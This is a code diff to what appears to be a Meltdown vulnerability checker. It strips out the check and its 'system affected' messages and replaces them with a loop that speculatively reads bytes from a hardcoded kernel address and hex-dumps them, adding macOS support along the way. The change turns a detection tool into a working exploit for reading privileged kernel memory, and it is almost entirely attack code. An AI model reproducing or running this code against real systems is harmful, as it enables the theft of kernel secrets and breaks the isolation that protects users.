@@ -34,6 +34,7 @@
 #include <iostream>
 #include <sstream>
 #include <cstdint>
+#include <array>
 #include <cstdlib>
 #include <cstring>
 #include <memory>
@@ -45,13 +46,26 @@
 #include <unistd.h>
 #include <sys/utsname.h>
 #include <signal.h>
-#include <ucontext.h>
 #include <sys/syscall.h>
-#include "assembly_utils.hh"
 
 #if !(defined(__x86_64__))
 # error "x86-64 is the only arch supported at the moment. We'll add support for i386 soon. Sorry :-("
 #endif
+
+#ifdef __APPLE__
+#define _XOPEN_SOURCE
+#include <sys/ucontext.h>
+#define RIP context->uc_mcontext->__ss.__rip
+#define SPECULATIVE_EXIT _speculative_byte_load_exit
+
+#else
+#include <ucontext.h>
+#define RIP context->uc_mcontext.gregs[REG_RIP]
+#define SPECULATIVE_EXIT __speculative_byte_load_exit
+
+#endif
+
+#include "assembly_utils.hh"
 
 static const char* kernel_symbols_file = "/proc/kallsyms";
 static const char* system_map_file_prefix = "/boot/System.map-";
@@ -83,7 +97,7 @@ static inline unsigned mem_size() {
 
 static void transaction_trap_mitigation(int cause, siginfo_t* info, void* uap) {
     ucontext_t* context = reinterpret_cast<ucontext_t*>(uap);
-    context->uc_mcontext.gregs[REG_RIP] = (uintptr_t)__speculative_byte_load_exit;
+    RIP = (uintptr_t)SPECULATIVE_EXIT;
 }
 
 static inline void setup_transaction_trap_mitigation() {
@@ -111,8 +125,11 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         for (auto i = 0; i < total_pages; i++) {
             __clflush(&pages[i * page_size()]);
         }
+
+#ifndef __APPLE__
         // issue dummy syscall. Needed for timing issues which i can't explain it yet.
         syscall(0, 0, 0, 0);
+#endif  
 
         // Speculatively read byte from kernel address and execute a dependent instruction on
         // buf[read byte * 4096] which makes L1 cache it.
@@ -166,7 +183,7 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
 //
 static bool validate_syscall_table_entry(const void* data, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
     uint64_t* entry = (uint64_t*) data;
-    uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[0]);
+    uintptr_t ptr = static_cast<uintptr_t>(entry[0]);
 
     if (symbol_map.count(ptr)) {
         auto symbol = symbol_map.at(ptr);
@@ -260,12 +277,89 @@ static inline bool has_TSX() {
     return (has_hle && has_rtm);
 }
 
+class dumper {
+public:
+    dumper(uintptr_t startAddr) {
+        //memset(ascii, 0, sizeof(ascii));
+        _addr = (unsigned long)(startAddr / 16) * 16;
+        auto padding = startAddr % 16;
+        
+        if(!padding)
+            return;
+
+        printAddr();
+        while (padding--) {
+            printf("   ");
+            ascii += " ";
+            _addr ++;
+        }
+    };
+    void dump(uint8_t data){
+        printAddr();
+        _finalized = false;
+        printf("%02X ", data);
+        if (data >= ' ' && data <= '~')
+            ascii += data;
+        else
+            ascii += ".";
+        _addr ++;
+
+        if (_addr % 16 == 0)
+            finalize();
+    };
+    void dumpInvalid(){
+        printAddr();
+        _finalized = false;
+        printf("XX ");
+        ascii += " ";   
+        _addr ++;
+        if (_addr % 16 == 0){
+            finalize();
+        }
+    }
+    void finalize(){
+       
+        if(_finalized == true){
+            printf("\n");
+            return;
+        }
+         _finalized = true;
+        auto padding = 16 - _addr % 16;
+        if(padding == 16){
+            padding = 0;
+        }
+        while (padding--) {
+            printf("   ");
+            ascii += " ";
+            _addr ++;
+        }
+        printf("|  %s  |\n", ascii.c_str());
+        ascii = "";
+    }
+    ~dumper(){
+        finalize();
+    }
+protected:
+    void printAddr(){
+        if(_addr % 16 == 0 )
+          printf("0x%016lx | ", _addr);
+    }
+    bool _finalized = false;
+    uintptr_t _addr;
+    std::string ascii;
+};
+
 int main(int argc, char** argv) {
     g_tsx_supported = has_TSX();
 
     if (!g_tsx_supported) {
+        printf("TSX is not supported, falling back to signals\n");
         setup_transaction_trap_mitigation();
-    }
+    }else
+        printf("TSX is supported!\n");
+
+    size_t len = 25;
+    uintptr_t target_address = 0xffffffff812114d1;
 
     auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));
     if (mem == MAP_FAILED) {
@@ -273,48 +367,20 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    auto symbol_map = build_symbol_map(kernel_symbols_file);
-    auto target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);
-    if (!target_address) {
-        // TODO: find a better alternative than /boot/system_map which requires root.
-        // A possible idea is described by Raphael in https://github.com/raphaelsc/Am-I-affected-by-Meltdown/issues/2
+    {
+        dumper d(target_address);
 
-        std::cout << "Unable to find symbol " << syscall_table_symbol << " in " << kernel_symbols_file << std::endl;
-
-        // Unable to find syscall table symbol in kernel_symbols_file, so falling back on
-        // System.map file stored in /boot, root is required though.
-        struct utsname uts;
-        auto r = uname(&uts);
-        if (r == -1) {
-            printf("uname() failed: %s\n", strerror(errno));
-            return -1;
-        }
-        std::string system_map_fname = system_map_file_prefix + std::string(uts.release);
-        std::cout << "Falling back on the alternative symbol map file (usually requires root permission): " << system_map_fname << "..." << std::endl;
-
-        symbol_map = build_symbol_map(system_map_fname);
-        target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);
-        if (!target_address) {
-            std::cout << "Also unable to find symbol " << syscall_table_symbol << "in alternative symbol map file :-(" << std::endl;
-            abort();
+        auto offs = 0;
+        while (len--){
+            int status = 0;
+            auto data = probe_one_syscall_table_address_byte(target_address + offs++, mem, status);
+            if (status == -1) {
+                d.dumpInvalid();
+            }else
+                d.dump(data);
         }
     }
-
-    std::cout << "Checking whether system is affected by Variant 3: rogue data cache load (CVE-2017-5754), a.k.a MELTDOWN ...\n";
-
-    printf("Checking syscall table (sys_call_table) found at address 0x%016lx ...\n", (uintptr_t)target_address);
-
-    for (auto entry = 0; entry < syscall_table_entries; entry++) {
-        auto ret = check_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
-        if (ret) {
-            std::cout << "\nSystem affected! Please consider upgrading your kernel to one that is patched with KAISER\n";
-            std::cout << "Check https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html for more details\n";
-            goto out;
-        } else {
-            std::cout << "so far so good (i.e. meltdown safe) ...\n";
-        }
-    }
-    std::cout << "\nSystem not affected. Congratulations!\n";
-out:
+        
     return munmap(static_cast<void*>(mem), mem_size());
 }
+ 
